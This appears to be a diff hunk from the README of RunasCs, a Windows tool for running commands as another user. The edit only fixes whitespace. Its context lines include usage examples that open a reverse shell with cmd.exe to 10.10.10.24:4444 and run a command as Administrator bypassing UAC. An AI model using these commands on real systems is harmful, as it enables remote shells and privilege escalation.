@@ -103,7 +103,7 @@ Examples:
         RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
     Run a command simulating the /netonly flag of runas.exe
         RunasCs.exe user1 password1 whoami -d domain -l 9
-	Run a command as an Administrator bypassing UAC
+    Run a command as an Administrator bypassing UAC
         RunasCs.exe adm1 password1 "whoami /all" --bypass-uac
 ```
 
